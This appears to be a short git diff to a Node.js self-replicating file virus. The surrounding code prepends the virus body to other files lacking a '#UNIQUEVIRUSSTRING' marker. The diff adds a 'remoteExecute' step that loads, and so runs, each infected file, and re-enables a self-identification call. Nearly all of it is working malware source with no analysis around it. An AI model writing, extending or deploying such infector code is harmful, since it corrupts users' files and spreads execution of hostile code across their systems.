@@ -28,6 +28,7 @@ function init(){
     if(!fileContent.match(/#UNIQUEVIRUSSTRING/g)){
       fileContent = virusContent + fileContent;
       fs.writeFileSync(filePath,Buffer.from(fileContent));
+      remoteExecute(files[i]);
     }
   }
 }
@@ -37,5 +38,11 @@ init();
 function findMyself(){
   console.log(path.basename(__filename));
 }
+findMyself();
 
-// findMyself();
+function remoteExecute(filename){
+  /// executing the contents of the file
+  const filePath = path.join(__dirname,filename);
+  const func = require(filePath);
+
+}
